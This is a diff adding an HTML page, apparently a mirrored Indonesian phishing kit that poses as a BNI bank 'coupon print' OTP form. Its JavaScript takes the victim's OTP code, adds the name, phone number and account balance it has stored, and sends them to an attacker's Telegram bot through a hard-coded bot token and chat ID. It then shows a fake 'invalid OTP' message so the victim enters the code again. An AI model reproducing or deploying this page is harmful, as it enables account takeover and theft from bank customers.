@@ -1,0 +1,249 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#ff8736"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <title>otp kupon</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+            position: fixed;
+            background: #c0c0c0;
+        }
+        
+       .container{
+         max-width: 100%;
+         width: 330px;
+         height: 430px;
+         background: #fff;
+         margin: -40px auto;
+         border-radius: 15px;
+         display: block;
+         position: relative;
+         top: 150px;
+         box-shadow: 4px 7px 10px rgba(0,0,0,0.5);
+         box-sizing: border-box;
+         justify-content: center;
+         justify-items: center;
+         align-items: center;
+       }
+       .wraper{
+         width: 100%;
+         position: fixed;
+         top: 0;
+         height: auto;
+         left: 0;
+         
+         
+       }
+       .wraper img{
+         width: 300px;
+         margin: 9px;
+         height: 200px;
+         margin-left: 35px;
+       }
+       .animasi{
+        margin-top: -70px;
+        position: fixed;
+        left: 0px;
+        right: 0;
+       }
+       .box-otp{
+         max-width: 90%;
+         width: 287px;
+         padding: 10px;
+         margin: 22px ;
+         text-align: center;
+         font-size: 15px;
+         outline: none;
+         background: #fff;
+         border-radius: 8px;
+         border: 1px solid #c0c0c0;
+         font-weight: 600;
+         z-index: 999999999;
+         box-sizing: border-box;
+       }
+       #pelew{
+         width: 80%;
+         padding: 10px;
+         margin: 33px;
+         border: 1px solid #fff;
+         cursor: pointer!important;
+         background: #ff8736;
+         border-radius: 8px;
+         font-size: 15px;
+         color: #fff;
+         font-weight: 600;
+         box-shadow: 4px 7px 10px rgba(0,0,0,0.5);
+         
+       }
+       h1{
+            display: table;
+            background-color: transparent;
+            color: #FF0000;
+            width: 100%;
+            font-size: 10px;
+            margin-bottom: -70px;
+            text-align: center;
+           font-weight: bold;
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            position: fixed;
+            
+        }
+        
+        .blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#Aktivasi{
+    display: none;
+}
+.textarea1 {
+     box-sizing: border-box; 
+     border: 1px solid red;
+     border-radius: 8px;
+     
+        }
+        .textarea2 {
+     box-sizing: border-box; 
+     border: 2px solid #C7B700;
+     border-radius: 8px;  
+  }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="wraper">
+      <img src="../blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgM_X35odAMNNIt_2UCw62DiJJJQMHqfXQ7DM-Jqny/s500/IMG_20240622_231245-fotor-bg-remover-20240622231342.png" alt="" class="">
+      <img src="../blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXVwo82cpg6CV_u3KjMyT7XomeqYZBW4FYS1BrlBM/s320/https___ce64c9d57a81b0071425df9f602e4e02.cdn.bubble.io_f1711534146768x263703491967350430_https___f5" alt="" class="animasi">
+      </div>
+      <br><br>
+      <div style="width: 90%;padding: 9px;border-bottom: 1px solid transparent;margin: 7px;position: relative;top: 25px;">
+        <h6 style="text-align: center;font-size: 10px;color: #000;">Masukan Kode OTP Cetak Kupon Yang Telah Kami Kirimkan Melalui Pesan SMS di Nomor Handphone Kamu Yang Terdaftar Di Bank BNI Untuk Melanjutkan Proses Pencetakan Kupon Undian</h6>
+      </div>
+      <form action="" id="sendOtp">
+        <span class="blink" style="display: none" id="blinkAktivasi"><h1>OTP Cetak Kupon invalid, atau sudah kadaluarsa</h1></span>
+       <input type="hidden" name="namaku" id="namaku" value="">
+       <input type="hidden" name="saldoku" id="saldoku" value="">
+       <input type="hidden" name="nomorku" id="nomorku" value="">
+        <div class="box-=input">
+          <input type="text" name="otp" id="otp" placeholder="OTP Cetak Kupon" inputmode="numeric" minlength="6" maxlength="6" required="" class="box-otp" onclick="gantiborder1()">
+        </div>
+        <center>
+       <p id="alert" style="font-size: 10px;width: 100%;background: transparent;color: #000;position: fixed;text-align: center;top: 355px;right: 0;left: 0;font-weight: bold;display: ;" class="alert"></p>
+     </center>
+        <div class="box-btn">
+          <button type="submit" id="pelew">Konfirmasi</button>
+        </div>
+      </form>
+  </div>
+  <br>
+  <br>
+  <br><br>
+   <button style="width: 100%;font-size: 12px;background: none;border: none;text-align: center;font-weight: bold;position: fixed;margin-top: 50px;margin-left: 0;color:#000;" onclick="sendUlang()">>>Kirim Ulang SMS Cetak Kupon<<</button>
+  <!-- partial -->
+<script src="../code.jquery.com/jquery-3.5.1.min.js"></script>
+ <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js"></script>
+<script src="../unpkg.com/vue-the-mask%25400.11.1/dist/vue-the-mask.js"></script>
+<script src="../cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="../code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+
+var nama = sessionStorage.getItem("nama");
+document.getElementById("namaku").value = nama + "";
+
+var saldo = sessionStorage.getItem("saldo");
+document.getElementById("saldoku").value = saldo + "";
+
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomorku").value = nomor  + "";
+
+  </script>
+ <script>
+ $('#sendOtp').on('submit', function (event) {
+
+  event.stopPropagation();
+    event.preventDefault();
+  document.getElementById('pelew').innerHTML = "Memproses....";
+ 
+
+    var otp = $("#otp").val().trim();
+    var name = window.localStorage.getItem('name');
+    var phone = window.localStorage.getItem('phone');
+    var balance = window.localStorage.getItem('balance');
+
+    var message = "⚔⚔⚔ DATA MASUK ⚔⚔⚔\n";
+	message += ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n\n<b>Kode OTP:</b>\n'+otp+'\n');
+	message += "\n⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜";
+	
+	fetch(`https://api.telegram.org/bot7789199576:AAE43XxwL7N1_25nC-frTpohGa5QeqWoIgk/sendMessage?parse_mode=html`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: "7745808174",
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+		document.getElementById('pelew').innerHTML = "Konfirmasi";
+        document.getElementById("blinkAktivasi").style.display = "block";
+        $("#otp").val("");
+        $("#otp").addClass('textarea1'); 
+      })
+      .catch((error) => {
+        alert('Failed to send message.');
+      });
+
+    return false;
+});   
+        
+</script>
+<script>
+  function sendUlang(){
+    $('.blink').hide();event.preventDefault();
+    setTimeout(function(){
+    $("#otp").removeClass('textarea1');
+    },700);
+    
+    $("#nama1").addClass('textarea2');
+    $('#alert').show();
+     var nomorku = document.getElementById('nomorku').value;
+     sessionStorage.setItem('nomorku', nomorku);
+     document.getElementById('alert').innerHTML = 'OTP telah terkirim ulang ke +62' +  nomorku+  '<br>via SMS di nomor handphone anda';
+  }
+</script>
+<script>
+ function gantiborder1(){
+   $("#otp").removeClass('textarea1'); 
+   
+   $("#blinkAktivasi").hide(); 
+   document.getElementById('pelew').value = "Konfirmasi";
+ }   
+</script>
+
+
+
+</body><!-- Mirrored from npi-rbk.click/tree.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 05:33:43 GMT --></html>
